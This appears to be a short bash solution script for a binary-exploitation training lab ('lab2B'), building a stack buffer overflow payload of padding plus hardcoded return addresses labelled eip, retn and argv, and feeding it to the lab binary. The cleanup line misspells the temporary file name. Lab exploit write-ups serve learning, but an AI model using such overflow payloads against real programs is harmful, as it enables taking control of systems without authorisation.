#!/bin/bash
junk=$(python3 -c 'print("A"*23+"BBBB")')
echo -en $junk > /tmp/outfile
echo -en "\xbd\x86\x04\x08" >>/tmp/outfile #eip
echo -en "\x38\x87\x04\x08" >>/tmp/outfile #retn
echo -en "\xd0\x87\x04\x08" >>/tmp/outfile #argv
/levels/lab02/lab2B $(cat /tmp/outfile)
rm -f /tmp/outfil